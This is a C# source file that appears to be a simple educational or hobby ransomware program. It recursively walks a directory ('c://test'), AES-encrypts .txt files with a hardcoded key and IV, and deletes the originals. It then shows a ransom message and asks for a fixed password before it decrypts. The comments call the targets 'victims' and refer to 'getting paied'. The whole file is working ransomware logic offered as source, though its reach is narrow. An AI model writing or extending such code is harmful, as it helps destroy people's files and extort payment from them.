using System;
using System.Security.Cryptography;
using System.IO;
using System.Linq;

namespace Lost
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            // Create the key
            var aes = new AesCryptoServiceProvider();
            aes.Key = Convert.FromBase64String(@"OoIsAwwF23cICQoLDA0ODe==");
            aes.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };

            // Decide on base directory
            string baseDirectory = "c://test";

            // Encrypt the victims files 
            itterate(baseDirectory, aes, "encrypt");

            // getting paied
            System.Console.WriteLine("Your feils have been encryptrd! to decrypt them enter the password:");
            string password = System.Console.ReadLine();
            while (password != "password")
            {
                System.Console.WriteLine("Wrong password!");
                password = System.Console.ReadLine();
            }

            // Decrypting the victims files after getting paied 
            itterate(baseDirectory, aes, "decrypt");
            System.Console.WriteLine("Your feils have been decrypted :)");


        }



        public static void encryptFile(string filePath, AesCryptoServiceProvider aes)
        {
            var buffer = new byte[65536];

            using (var streamIn = new FileStream(filePath, FileMode.Open))
            using (var streamOut = new FileStream(filePath + ".enc", FileMode.Create))
            using (var encrypt = new CryptoStream(streamOut, aes.CreateEncryptor(), CryptoStreamMode.Write))
            {
                int bytesRead;
                do
                {
                    bytesRead = streamIn.Read(buffer, 0, buffer.Length);
                    if (bytesRead != 0)
                        encrypt.Write(buffer, 0, bytesRead);
                }
                while (bytesRead != 0);
            }
            File.Delete(filePath);

        }

        public static void decryptFile(string filePath, AesCryptoServiceProvider aes)
        {

            //create new file name
            string origname = filePath.Remove(filePath.Length - 4);
            var buffer = new byte[65536];
            using (var streamIn = new FileStream(filePath, FileMode.Open))
            using (var streamOut = new FileStream(origname, FileMode.Create))
            using (var decrypt = new CryptoStream(streamOut, aes.CreateDecryptor(), CryptoStreamMode.Write))
            {
                int bytesRead;
                do
                {
                    bytesRead = streamIn.Read(buffer, 0, buffer.Length);
                    if (bytesRead != 0)
                        decrypt.Write(buffer, 0, bytesRead);
                }
                while (bytesRead != 0);
            }
            File.Delete(filePath);

        }

        public static void itterate(string cuurentDirectory, AesCryptoServiceProvider aes, string mod)
        {

            var currentFiles = Directory.GetFiles(cuurentDirectory, "*.txt");
            //var currentPictures = Directory.GetFiles(cuurentDirectory, "*.jpg");
            //currentFiles = currentFiles.Union(currentPictures).Distinct().ToArray();
            if (mod == "decrypt")
                currentFiles = Directory.GetFiles(cuurentDirectory, "*.enc");
            else if (mod != "encrypt")
                throw new Exception();



            foreach (string filePath in currentFiles)
            {
                if (mod == "encrypt")
                    encryptFile(filePath, aes);
                else if (mod == "decrypt")
                    decryptFile(filePath, aes);
                else
                    throw new Exception();
            }
            var currentDirectories = Directory.GetDirectories(cuurentDirectory);
            foreach (string directory in currentDirectories)
            {
                itterate(directory, aes, mod);
            }

        }
    }
}
